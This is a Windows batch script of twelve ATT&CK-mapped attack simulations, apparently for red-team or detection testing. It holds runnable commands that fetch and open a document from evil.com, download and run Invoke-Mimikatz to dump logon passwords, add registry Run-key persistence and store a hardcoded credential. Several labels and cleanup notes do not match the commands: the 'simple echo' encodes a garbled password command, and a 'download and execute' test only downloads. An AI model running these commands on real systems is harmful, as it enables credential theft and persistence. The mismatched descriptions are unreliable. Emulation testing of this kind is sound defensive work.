@echo off
REM Windows Attack Commands Test Script
REM WARNING: Run in isolated test environment only!

REM ========== Test 1: Simulate Spearphishing with a Malicious Macro-Enabled Document ==========
REM TTP: T1566.001 - Phishing
REM Tactic: Initial Access
echo Executing: Simulate Spearphishing with a Malicious Macro-Enabled Document
powershell -c "Invoke-WebRequest -Uri 'http://evil.com/payload.docm' -OutFile 'C:\Users\Public\Documents\invoice.docm'; Start-Process -FilePath 'C:\Users\Public\Documents\invoice.docm'"
echo Cleanup: Remove the downloaded file: Remove-Item 'C:\Users\Public\Documents\invoice.docm' -Force
REM Remove the downloaded file: Remove-Item 'C:\Users\Public\Documents\invoice.docm' -Force
echo.

REM ========== Test 2: Simulate Spearphishing with a Link to a Credential Harvesting Site ==========
REM TTP: T1566.001 - Phishing
REM Tactic: Initial Access
echo Executing: Simulate Spearphishing with a Link to a Credential Harvesting Site
powershell -c "Invoke-WebRequest -Uri 'https://tinyurl.com/y8888888' -OutFile 'C:\Users\Public\Documents\phish_report.html'; Start-Process -FilePath 'C:\Users\Public\Documents\phish_report.html'"
echo Cleanup: Remove the downloaded file: Remove-Item 'C:\Users\Public\Documents\phish_report.html' -Force
REM Remove the downloaded file: Remove-Item 'C:\Users\Public\Documents\phish_report.html' -Force
echo.

REM ========== Test 3: Download and Execute a Simple Script from the Internet (Invoke-WebRequest) ==========
REM TTP: T1059.001 - PowerShell
REM Tactic: Execution
echo Executing: Download and Execute a Simple Script from the Internet (Invoke-WebRequest)
powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/attack-navigator/master/layers/example.json' -OutFile 'C:\Users\Public\example.json'"
echo Cleanup: Remove the downloaded file: `Remove-Item 'C:\Users\Public\example.json' -Force`
REM Remove the downloaded file: `Remove-Item 'C:\Users\Public\example.json' -Force`
echo.

REM ========== Test 4: Base64 Encoded PowerShell Command (Simple Echo) ==========
REM TTP: T1059.001 - PowerShell
REM Tactic: Execution
echo Executing: Base64 Encoded PowerShell Command (Simple Echo)
powershell -EncodedCommand "UwBlAHQALQBVAHMAZQByAFEAdQBhAGwAaQB0AHkAIABTAHQAYQB0AHUAcwAgAC0AUABhAHMAcwB3AG8AcgBkACAAIgB0AGUAcwB0ACIA"
echo Cleanup: There is no cleanup necessary as the command does not modify the system.
REM There is no cleanup necessary as the command does not modify the system.
echo.

REM ========== Test 5: Create Registry Run Key for Notepad.exe ==========
REM TTP: T1547.001 - Registry Run Keys
REM Tactic: Persistence
echo Executing: Create Registry Run Key for Notepad.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NotepadStartup" /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
echo Cleanup: reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NotepadStartup" /f
REM reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NotepadStartup" /f
echo.

REM ========== Test 6: Create Registry Run Key for a PowerShell Script ==========
REM TTP: T1547.001 - Registry Run Keys
REM Tactic: Persistence
echo Executing: Create Registry Run Key for a PowerShell Script
powershell -c "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MyStartupScript' -Value 'powershell -ExecutionPolicy Bypass -File \'C:\Temp\startup_script.ps1\''"
echo Cleanup: Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MyStartupScript' -Force; Remove-Item -Path C:\Temp\test_file.txt -Force
REM Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\MyStartupScript' -Force; Remove-Item -Path C:\Temp\test_file.txt -Force
echo.

REM ========== Test 7: Mimikatz - Dump Credentials (Safe Mode) ==========
REM TTP: T1003 - OS Credential Dumping
REM Tactic: Credential Access
echo Executing: Mimikatz - Dump Credentials (Safe Mode)
powershell "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '""sekurlsa::logonpasswords""'"
echo Cleanup: No specific cleanup is required.  The downloaded script and any temporary files created by Invoke-Mimikatz are typically handled by PowerShell and will be cleaned up automatically.  Review event logs to ensure no unexpected entries remain.
REM No specific cleanup is required.  The downloaded script and any temporary files created by Invoke-Mimikatz are typically handled by PowerShell and will be cleaned up automatically.  Review event logs to ensure no unexpected entries remain.
echo.

REM ========== Test 8: Windows Credential Manager Access (Safe Method) ==========
REM TTP: T1003 - OS Credential Dumping
REM Tactic: Credential Access
echo Executing: Windows Credential Manager Access (Safe Method)
cmdkey /list
echo Cleanup: No cleanup is required. The cmdkey command does not create any persistent artifacts.
REM No cleanup is required. The cmdkey command does not create any persistent artifacts.
echo.

REM ========== Test 9: Establish RDP Connection to a Localhost ==========
REM TTP: T1021.001 - Remote Desktop Protocol
REM Tactic: Lateral Movement
echo Executing: Establish RDP Connection to a Localhost
mstsc /v:127.0.0.1 /admin
echo Cleanup: Close the Remote Desktop Connection window. No specific cleanup is required beyond that.
REM Close the Remote Desktop Connection window. No specific cleanup is required beyond that.
echo.

REM ========== Test 10: RDP Connection with Specified Credentials ==========
REM TTP: T1021.001 - Remote Desktop Protocol
REM Tactic: Lateral Movement
echo Executing: RDP Connection with Specified Credentials
cmdkey /generic:127.0.0.1 /user:testuser /pass:P@sswOrd123 && mstsc /v:127.0.0.1
echo Cleanup: Remove the stored credential using `cmdkey /delete:127.0.0.1`. Close the Remote Desktop Connection window.
REM Remove the stored credential using `cmdkey /delete:127.0.0.1`. Close the Remote Desktop Connection window.
echo.

REM ========== Test 11: Execute a PowerShell script using WMI to display a message box ==========
REM TTP: UNMAPPED - Windows Management Instrumentation
REM Tactic: Execution
echo Executing: Execute a PowerShell script using WMI to display a message box
powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe -c \"[System.Windows.Forms.MessageBox]::Show(\'Hello from WMI!\')\"'"
echo Cleanup: No cleanup is strictly necessary as the message box will close automatically. The created process will also automatically exit.
REM No cleanup is strictly necessary as the message box will close automatically. The created process will also automatically exit.
echo.

REM ========== Test 12: Enumerate Running Processes via WMI ==========
REM TTP: UNMAPPED - Windows Management Instrumentation
REM Tactic: Execution
echo Executing: Enumerate Running Processes via WMI
powershell -c "Get-WmiObject -Class Win32_Process | Select-Object Name, ProcessID"
echo Cleanup: No cleanup is necessary, this is a read-only operation.
REM No cleanup is necessary, this is a read-only operation.
echo.

